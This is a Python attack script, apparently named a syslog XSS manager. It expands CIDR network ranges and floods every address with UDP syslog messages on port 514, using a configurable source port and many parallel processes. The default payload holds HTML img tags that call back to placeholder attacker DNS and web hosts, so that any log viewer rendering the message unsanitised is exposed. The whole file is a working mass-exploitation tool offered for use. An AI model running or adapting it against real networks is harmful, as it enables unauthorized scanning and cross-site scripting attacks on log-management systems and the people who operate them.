__author__ = 'isox'
import netaddr
from multiprocessing import Pool
import socket
import string
import random
import time
from optparse import OptionParser

FACILITY = {
    'kern': 0, 'user': 1, 'mail': 2, 'daemon': 3,
    'auth': 4, 'syslog': 5, 'lpr': 6, 'news': 7,
    'uucp': 8, 'cron': 9, 'authpriv': 10, 'ftp': 11
}

LEVEL = {
    'emerg': 0, 'alert':1, 'crit': 2, 'err': 3,
    'warning': 4, 'notice': 5, 'info': 6, 'debug': 7
}


def asyncSendPayload(sharedSocket, ipaddress, port, payload):
    retryCount = 5
    retryCurrent = 0
    facility = FACILITY.get('kern')
    level = LEVEL.get('emerg')
    data = '<%d>%s' % (level + facility*8, payload)
    finished = False
    while not finished:
        try:
            sharedSocket.sendto(data.encode(), (ipaddress, port))
            finished = True
        except Exception as e:
            time.sleep(1)
        retryCurrent += 1
        if retryCurrent > retryCount:
            print("Fatal error sending to %s" % ipaddress)
            finished = True
    #print("Sent: %s" % (data.encode()))
    return True


class syslogXssManager(object):
    def __init__(self, cidrNetworkList, portList = None, maxProcesses = None, replayCount = None, payload = None):
        self.maxProcesses = maxProcesses or 30
        self.replayCount = replayCount or 1
        self.bindPorts = [int(port) for port in portList] or [53]
        self.cidrNetworkList = cidrNetworkList
        self.payload = payload

    def job(self):
        targetList = self.createTask()
        self.runAttack(targetList)

    def idGenerator(self, size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))

    def createTask(self):
        # Here goes example xss/dns payload
        # Listen for the logs of the ns server
        # Prepare www server for callbacks
        dnsServer = 'nsserv.example.com'
        webServer = 'web.example.com'
        examplePayload = "%s'\"><img/src=//%s."+ dnsServer + "><img/src=//" + webServer + "/1.png?%s><"
        payload = self.payload or examplePayload
        print("Using payload: %s" % payload)
        attackNetworkList = [netaddr.IPNetwork(networkCidr) for networkCidr in self.cidrNetworkList]
        network = netaddr.IPSet(attackNetworkList)
        print("Total attack len: %s" % len(network))
        attackTargetList = [{'ipaddress':"%s" % ipAddress, 'port':514, 'payload':self.payload or (payload % (self.idGenerator(), ipAddress, ipAddress))} for ipAddress in network]
        return attackTargetList


    def runAttack(self, targetList):
        # targetList = [{'ipaddress:':'127.0.0.1', 'port':53, 'payload':'blablabla']
        for counter in range(0, self.replayCount):
            for port in self.bindPorts:
                requestPool = Pool(processes=self.maxProcesses)
                sharedSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sharedSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sharedSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                #sharedSocket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)
                try:
                    sharedSocket.bind(('', port))
                    print("Sending packets from port %s" % port)
                    taskList = [(sharedSocket, targetParams.get('ipaddress'), targetParams.get('port'), targetParams.get('payload')) for targetParams in targetList]
                    results = requestPool.starmap(asyncSendPayload, taskList)
                except Exception as e:
                    print("Failed binding port %s: %s" % (port, e))
                print("Closing process pool")
                requestPool.close()
                print("Joining process pool")
                requestPool.join()
                print("Closing shared socket")
                sharedSocket.close()
        return True

def main():
    parser = OptionParser(usage="usage: %prog [options] network CIDR",
                          version="%prog 1.0")
    parser.add_option("-f", "--file",
                      default=False,
                      help="Read CIDR network list splitted by newline from file")
    parser.add_option("-t", "--threads",
                      default=30,
                      help="Threads concurency, default 30")
    parser.add_option("-r", "--replay",
                      default=False,
                      help="Perform replay of the attack, default 1")
    parser.add_option("-p", "--port",
                      default=53,
                      help="Bind port to send packets from. Default 53. May be set as '53,54,55'")
    parser.add_option("-m", "--message",
                      default=None,
                      help="Set customized payload string")
    (options, args) = parser.parse_args()

    if not options.file and len(args) != 1:
        parser.error("Wrong number of arguments")
    cidrNetworkList = set()
    if options.file:
        with open(options.file, 'r') as fileDescriptior:
            dataFromFile = fileDescriptior.read().strip(


            )
            cidrNetworkList = cidrNetworkList.union(set(dataFromFile.splitlines()))
    cidrNetworkList = cidrNetworkList.union(set(args))
    syslogAttacker = syslogXssManager(cidrNetworkList, portList=("%s" % options.port).split(","),maxProcesses=int(options.threads), replayCount=int(options.replay), payload=options.message)
    syslogAttacker.job()

if __name__ == '__main__':
    main()
